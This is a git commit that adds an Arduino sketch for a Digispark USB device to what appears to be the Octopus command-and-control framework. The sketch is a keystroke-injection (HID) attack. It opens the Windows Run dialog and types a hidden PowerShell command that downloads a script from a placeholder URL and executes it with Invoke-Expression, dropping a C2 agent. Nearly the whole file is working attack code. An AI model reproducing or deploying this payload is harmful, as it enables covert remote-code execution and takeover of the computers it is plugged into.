05fcbca902400eb3b2f9dacb7d28eb3f54d7322f
askar <m.askar@isecur1ty.org>
2020-01-22 22:26:36 +0200

    create ino payload

---
+++ agents/agent.ino
@@ -0,0 +1,18 @@
+// Drop Octopus agent via keystrokes (HID Attack)
+// Credits to hak5 and samratashok (developer of the nishang framework).
+
+#include "DigiKeyboard.h"
+void setup() {
+}
+
+void loop() {
+  DigiKeyboard.sendKeyStroke(0);
+  DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+  DigiKeyboard.delay(500);
+  DigiKeyboard.print(powershell -w hidden "$v = (New-Object Net.WebClient).DownloadString('OCT_URL');Invoke-Expression $v;");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  for (;;) {
+    /*Stops the digispark from running the scipt again*/
+  }
+}
